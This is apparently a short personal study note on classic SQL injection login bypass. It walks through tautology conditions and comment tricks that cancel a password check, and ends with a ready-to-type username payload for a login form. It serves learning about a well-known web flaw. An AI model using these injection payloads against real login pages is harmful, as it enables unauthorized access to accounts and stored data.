# classicn injection bypass
* say you have the db from [1-sql][def]
* say the db is hooked to an app and the app has a log-in page
    * the login page has a form whose input fields are `username` and `password`
* in the back-end, the sql query will be

    ```sql
        select * from users
        where uname="goatmatata"
        and passwd="ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f";
    ```

* it is possible to return an entry using sql injection viz
    1. tautology

            ```sql
                select * from users
                where uname="goatmatata" or "1"="1"
                and passwd="ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f" or "1"="1";
            ```

        * this works beacuse `"1"="1"` always evaluates to true (tautology)
    2. tautology and comments

            ```sql
                select * from users
                where uname="goatmatata" or 1=1;
                #and passwd="ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f";
            ```

            ```sql
                select * from users
                where uname="goatmatata" or 1=1;
                --and passwd="ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f";
            ```

            ```sql
                select * from users
                where uname="goatmatata" or 1=1;
                -- -and passwd="ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f";
            ```

            ```sql
                select * from users
                where uname="goatmatata" or 1=1;/*
                and passwd="ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f";
            ```

        * this works because tautologies work as they do and also because the commented code cannot be reached (because it is commented)
        * CAVEAT: type a closing `*/` in the terminal when the last query executes
* in the login form, you can type the following

    ```text
        username: goatmatata "or 1=1;--
        password: <anything>

        use whatever comment style you like
        use single quotes too
    ```
[def]: ./1-sql.md